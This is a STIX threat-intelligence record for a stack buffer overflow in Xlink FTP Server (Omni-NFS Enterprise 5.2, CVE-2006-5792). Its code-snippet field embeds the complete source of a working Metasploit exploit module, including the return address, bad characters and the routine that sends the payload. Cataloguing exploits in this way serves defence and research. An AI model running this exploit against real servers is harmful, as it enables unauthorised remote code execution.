{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e506257a-a8d0-4dbe-85e8-6d1835cb54a5",
    "created": "2024-08-14T16:50:59.432039Z",
    "modified": "2024-08-14T16:50:59.432043Z",
    "name": "Xlink FTP Server Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Xlink FTP Server that comes bundled with Omni-NFS Enterprise 5.2. When a overly long FTP request is sent to the server arbitrary code may be executed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/xlink_server.rb",
            "external_id": "xlink_server.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5792"
        },
        {
            "source_name": "reference",
            "url": "http://www.xlink.com"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Xlink FTP Server Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Xlink FTP Server\n        that comes bundled with Omni-NFS Enterprise 5.2.\n        When a overly long FTP request is sent to the server,\n        arbitrary code may be executed.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-5792' ],\n          [ 'OSVDB', '58646' ],\n          [ 'URL', 'http://www.xlink.com' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 260,\n          'BadChars' => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Omni-NFS Enterprise V5.2', { 'Ret' => 0x1001f09c } ], # OmniEOM.DLL 1.0.0.1\n        ],\n      'DisclosureDate' => '2009-10-03',\n      'DefaultTarget'  => 0))\n\n    deregister_options('FTPUSER', 'FTPPASS')\n  end\n\n  def check\n    connect\n    disconnect\n\n    if (banner =~ /XLINK FTP Server/)\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    connect\n\n    sploit =  payload.encoded + [target.ret].pack('V')\n    sploit << rand_text_alpha_upper(2024 - payload.encoded.length) + \"\\r\\n\"\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit)\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-03",
    "x_mitre_platforms": [
        "win'"
    ]
}